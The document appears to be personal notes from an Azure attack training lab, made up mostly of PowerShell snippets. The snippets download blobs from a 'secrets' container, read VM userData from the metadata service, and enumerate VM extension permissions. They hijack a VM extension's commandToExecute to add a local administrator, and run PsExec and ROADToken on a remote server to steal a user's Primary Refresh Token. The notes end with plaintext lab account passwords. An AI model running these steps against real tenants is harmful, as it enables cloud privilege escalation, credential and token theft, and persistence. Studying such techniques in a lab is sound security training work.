# Iterate through each storage account
foreach ($storageAccount in $storageAccounts) {
    Write-Host "Storage Account Name: $($storageAccount.StorageAccountName)"
    Write-Host "Resource Group: $($storageAccount.ResourceGroupName)"
    Write-Host "Location: $($storageAccount.Location)"
    Write-Host "------------------------------------"

    # Get the storage account context
    $context = New-AzStorageContext -StorageAccountName $storageAccount.StorageAccountName

    # List all containers in the storage account
    $containers = Get-AzStorageContainer -Context $context
    foreach ($container in $containers) {
        Write-Host "  Container Name: $($container.Name)"
        Write-Host "  Public Access Level: $($container.PublicAccess)"
        Write-Host "  ---------------------------"

        # List all blobs in the container
        $blobs = Get-AzStorageBlob -Container $container.Name -Context $context
        foreach ($blob in $blobs) {
            Write-Host "    Blob Name: $($blob.Name) : $($blob.ContentType)"
        }
    }
}

```
- Save blob
```
$containerName = "secrets"
$storageName = "defcorpcodebackup"
$context = New-AzStorageContext -StorageAccountName $storageName

# List all blobs in the container
$blobs = Get-AzStorageBlob -Container $containerName -Context $context
$blob = $blob[0]

# Download each blob
$destination = "C:\Windows\temp\"+$blob.Name

Get-AzStorageBlobContent -Blob $blob.Name `
                             -Container $containerName `
                             -Destination $destination `
                             -Context $context `
                             -Force
```

- Connect to VM 
```
$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student13', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
```
- Extract user data used by vm 
```
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

```

- Enumerate permissions from Microsoft.Compute/virtualMachines/extensions with ARM API when Get-AzRoleAssignment does not return anything  
```

$Token = (Get-AzAccessToken).Token

# Initialize an array to store unique VMs
$uniqueVMs = @()

# Step 1: Retrieve all resources of type Microsoft.Compute/virtualMachines/extensions
$vmExtensions = Get-AzResource 

# Step 2: Extract unique VM resource IDs
foreach ($extension in $vmExtensions) {
    if($extension.ResourceType -eq "Microsoft.Compute/virtualMachines/extensions"){

        # Parse the parent VM's resource ID from the extension's resource ID
        $vmResourceId = $extension.ResourceId -replace "/extensions/.*", ""
        if (-not ($uniqueVMs -contains $vmResourceId)) {
            $uniqueVMs += $vmResourceId
        }
    }
    
}

# Initialize a list to store results
$results = @()

# Step 3: Fetch permissions for each unique VM
foreach ($vmId in $uniqueVMs) {
    Write-Output "Fetching permissions for VM: $vmId"
    
    # Extract subscription ID and resource group from the VM resource ID
    if ($vmId -match "/subscriptions/(?<subscriptionId>[^/]+)/resourceGroups/(?<resourceGroup>[^/]+)/providers/Microsoft.Compute/virtualMachines/(?<vmName>[^/]+)") {
        $subscriptionId = $matches["subscriptionId"]
        $resourceGroup = $matches["resourceGroup"]
        $vmName = $matches["vmName"]

        # Construct the URI for the permissions API request
        $URI = "https://management.azure.com/subscriptions/$subscriptionId/resourceGroups/$resourceGroup/providers/Microsoft.Compute/virtualMachines/$vmName/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"

        # Make the API request
        $RequestParams = @{
            Method = 'GET'
            Uri = $URI
            Headers = @{
                'Authorization' = "Bearer $Token"
            }
        }

        try {
            $response = Invoke-RestMethod @RequestParams
            $permissions = $response.value

            # Store the permissions in the results list
            $results += [PSCustomObject]@{
                VMName            = $vmName
                ResourceGroup     = $resourceGroup
                SubscriptionId    = $subscriptionId
                Permissions       = ($permissions | ForEach-Object { $_.actions -join ", " }) -join "; "
            }
        } catch {
            Write-Error "Failed to fetch permissions for VM: $vmName. Error: $_"
        }
    }
}

# Step 4: Output the results
if ($results.Count -eq 0) {
    Write-Output "No permissions found for any VM."
} else {
    $results | Format-List
}
```

- Get VmExtention permission
```
# Get all VM extensions
$vmExtensions = Get-AzResource -ResourceType "Microsoft.Compute/virtualMachines/extensions"

# Initialize an array to store results
$results = @()

# Loop through each extension to get its permissions
foreach ($extension in $vmExtensions) {
    Write-Output "Fetching permissions for VM Extension: $($extension.Name)"

    # Construct the permissions API URI
    $uri = "https://management.azure.com$($extension.ResourceId)/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"

    try {
        # Make the REST API call
        $permissions = Invoke-RestMethod -Method GET -Uri $uri -Headers @{
            Authorization = "Bearer $token"
        }

        # Process and store the permissions
        foreach ($permission in $permissions.value) {
            $vmName = (($extension.ResourceId -split "/virtualMachines/")[1] -split "/extensions/"[0])[0]
            $results += [PSCustomObject]@{
                ExtensionName   = $extension.Name
                VMName          = $vmName
                ResourceGroup   = $extension.ResourceGroupName
                Actions         = $permission.actions -join ", "
                NotActions      = $permission.notActions -join ", "
            }
        }
    } catch {
        Write-Error "Failed to fetch permissions for VM Extension: $($extension.Name). Error: $_"
    }
}

# Output the results
if ($results.Count -eq 0) {
    Write-Output "No permissions found for any VM extension."
} else {
    $results | Format-List
}
```

- Edit the "commandToExecute" of a VmExtention
```
$vmExtension = (Get-AzResource -ResourceType "Microsoft.Compute/virtualMachines/extensions")[0]

$commandToExecute = "powershell net users student13 Stud13Password@123 /add /Y; net localgroup administrators student13 /add"

# Build the settings JSON string with properly escaped quotes
$settingsJson = @"
{
    "commandToExecute": "$commandToExecute"
}
"@

$vmName = (($vmExtension.ResourceId -split "/virtualMachines/")[1] -split "/extensions/")[0]
$vmExtensionName = $vmExtension.Name.Split("/")[-1]
$extension = Get-AzVMExtension -ResourceGroupName $vmExtension.ResourceGroupName -VMName $vmName -Name $vmExtensionName
$vmPublisher = $extension.Publisher
$vmExtensionType = $extension.ExtensionType
$TypeHandlerVersion = $extension.TypeHandlerVersion
# Correct the VMName extraction and use the proper JSON string
Set-AzVMExtension `
    -ResourceGroupName $vmExtension.ResourceGroupName `
    -ExtensionName  $vmExtensionName `
    -VMName $vmName `
    -Location $vmExtension.Location `
    -Publisher  $vmPublisher `
    -ExtensionType  $vmExtensionType `
    -TypeHandlerVersion $TypeHandlerVersion `
    -SettingString $settingsJson
```

- Checking hostname ip address
```
$dnsName = "infradminsrv"
Resolve-DnsName -Name $dnsName -Type ANY | Format-Table -AutoSize`
```
or 
```
function Get-DnsInfo {
    param (
        [string]$SearchTerm = ""  # Optional parameter to filter the DNS name
    )

    # Get active connections with netstat
    $connections = netstat -ano

    # Regex pattern to match only IP addresses
    $pattern = '(\d{1,3}(\.\d{1,3}){3})'

    # Extract all matches across all lines
    $ipAddresses = @()
    foreach ($line in $connections) {
        if ($line -match $pattern) {
            # Extract all matches within a single line
            $matches = [regex]::Matches($line, $pattern)
            foreach ($match in $matches) {
                $ipAddresses += $match.Groups[1].Value
            }
        }
    }

    # Remove duplicates and resolve DNS names
    $results = @()
    $ipAddresses = $ipAddresses | Sort-Object -Unique
    foreach ($ip in $ipAddresses) {
        try {
            $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
        } catch {
            $hostname = "Unresolved"
        }
        $results += [PSCustomObject]@{
            IPAddress = $ip
            Hostname  = $hostname
        }
    }

    # Filter results based on the search term (if provided)
    if (-not [string]::IsNullOrWhiteSpace($SearchTerm)) {
        $results = $results | Where-Object { $_.Hostname -like "*$SearchTerm*" }
    }

    # Display the filtered results
    $results | Format-Table -AutoSize
}


# Get-DnsInfo
# Get-DnsInfo -SearchTerm "infra"
```

- Execute block script on vm 
```
$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('.\student13', $Password)
$infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds
Invoke-Command -Session $infradminsrv -ScriptBlock{hostname}
Invoke-Command -Session $infradminsrv -ScriptBlock{whoami}
Invoke-Command -Session $infradminsrv -ScriptBlock{dsregcmd /status}

```
- Extract PRT Cookie using Roadtoken
```
Invoke-Command -Session $infradminsrv -ScriptBlock{mkdir C:\Users\Public\student13}
exit

$source = "C:\AzAD\Tools\"
$destination = "C:\Users\student13.jumpvm\Documents"
$items_to_copy = ('ROADToken.exe', 'PsExec64.exe', 'SessionExecCommand.exe')

foreach ($item in $items_to_copy) {Copy-Item -ToSession $jumpvm -Path ($source+"\"+$item) -Destination $destination  –Verbose}

$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student13', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm

$source = "C:\Users\student13.jumpvm\Documents"
$destination = "C:\Users\Public\student13"
$items_to_copy = ('ROADToken.exe', 'PsExec64.exe', 'SessionExecCommand.exe')

$password = ConvertTo-SecureString 'Stud13Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('.\student13', $Password)
$infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds

foreach ($item in $items_to_copy) {Copy-Item -ToSession $infradminsrv -Path ($source+"\"+$item) -Destination $destination  –Verbose}


Invoke-Command -Session $infradminsrv -ScriptBlock{ls C:\Users\Public\student13}


$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
$Params = @{
"URI" = $URL
"Method" = "POST"
}

$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce

Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\studentx\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\studentx\SessionExecCommand.exe MichaelMBarron C:\Users\Public\studentx\ROADToken.exe AwABAAAAAAACAOz_BAD0__OCpqJjNm0iqQeYC_uA7yQXLgGdvh0bkCFeeHv19WkOHqmHkP2TiMx5DmkiOXqBXAFczMZYsQS3BT8fsIxzUCYgAA > C:\Users\Public\student13\PRT.txt"}

```
- Temp
```
DavidDHenriques@defcorphq.onmicrosoft.com ; password: IAm@M0b1leUs3r@t0rganization

$username = 'thomasebarlow@defcorpit.onmicrosoft.com' ; $password = 'DeployM3ntUserInTh3Tan3nt!!'

$username = "stevencking@defcorphq.onmicrosoft.com";$password="St0rage@ccountsCanReadSt3v3n!!";

$email = "samcgray@defcorphq.onmicrosoft.com", $passwd =  'Manag3dUserF0rVirtualM@chines'

```

